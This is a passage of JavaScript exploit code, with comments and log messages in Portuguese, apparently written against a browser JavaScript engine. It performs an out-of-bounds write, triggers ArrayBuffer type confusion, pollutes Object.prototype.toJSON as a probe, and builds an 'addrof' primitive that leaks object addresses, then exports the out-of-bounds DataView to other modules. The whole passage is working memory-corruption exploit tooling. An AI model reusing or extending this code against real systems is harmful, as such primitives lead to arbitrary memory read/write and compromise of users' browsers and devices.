        oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET_core, HEISENBUG_CRITICAL_WRITE_VALUE_core, 4);
        await PAUSE(100);
        let confused_ab_candidate = new ArrayBuffer(HEISENBUG_VICTIM_AB_SIZE_core);
        let float_view_on_confused_ab = new Float64Array(confused_ab_candidate);
        const fillPatternForAddrof = 0.445566778812345;
        float_view_on_confused_ab.fill(fillPatternForAddrof);

        Object.defineProperty(Object.prototype, 'toJSON', { value: _toJSONProbeForAddrofInCoreInternal_v31_7, writable: true, configurable: true, enumerable: false });
        pollutedByCoreAddrof = true;
        JSON.stringify(confused_ab_candidate);

        if (_heisenbugConfirmedByProbe_core_internal_v31_7) {
            const val_double = float_view_on_confused_ab[0];
            addrof_result_internal.leaked_address_as_double = val_double;
            log(`[${FNAME_FUNC}] Heisenbug confirmada. Valor lido como double: ${val_double} (Hex: ${toHex(new Float64Array([val_double]).buffer, 64)})`, 'leak');

            if (val_double === fillPatternForAddrof) {
                addrof_result_internal.message = "Heisenbug ocorreu, mas valor no buffer não foi alterado (ainda é o fillPattern). Addrof falhou.";
            } else {
                const db_conv_buf = new ArrayBuffer(8);
                new Float64Array(db_conv_buf)[0] = val_double;
                const dv_conv_i = new Uint32Array(db_conv_buf);
                const potential_addr = new AdvancedInt64(dv_conv_i[0], dv_conv_i[1]);
                addrof_result_internal.leaked_address_as_int64 = potential_addr.toString(true); // Usa toHexHelper implicitamente
                log(`[${FNAME_FUNC}] Convertido para Int64: ${toHexHelper(potential_addr)}`, 'leak');

                if (!(potential_addr.high() === 0 && potential_addr.low() === 0) &&
                    !((potential_addr.high() & 0x7FF00000) === 0x7FF00000) &&
                    val_double !== 0
                ) {
                    addrof_result_internal.success = true;
                    addrof_result_internal.message = "Addrof (Heisenbug) supostamente bem-sucedido. Verifique o valor.";
                } else {
                    addrof_result_internal.message = `Heisenbug ocorreu, mas valor lido (${toHexHelper(potential_addr)}) não parece endereço válido.`;
                }
            }
        } else {
            addrof_result_internal.message = "Heisenbug não foi confirmada pela sonda.";
        }
    } catch (e) {
        addrof_result_internal.message = `Erro crítico em Addrof: ${e.message}`;
        log(`[${FNAME_FUNC}] Exception: ${e.message}`, 'critical');
    } finally {
        if (pollutedByCoreAddrof) {
            if (originalToJSONDescriptorForCoreAddrof) Object.defineProperty(Object.prototype, 'toJSON', originalToJSONDescriptorForCoreAddrof);
            else delete Object.prototype.toJSON;
        }
        _targetObjectForAddrofProbe_core_internal_v31_7 = null;
    }
    log(`[${FNAME_FUNC}] Resultado: ${JSON.stringify(addrof_result_internal)}`, addrof_result_internal.success ? 'good' : 'warn');
    return addrof_result_internal;
}

// NOVO: Exporta o DataView da OOB para uso síncrono por outros módulos.
// Esta é a mudança chave para permitir que o Fuzzer Estável (R47) funcione.
export function getOOBDataView() {
    return oob_dataview_real;
}
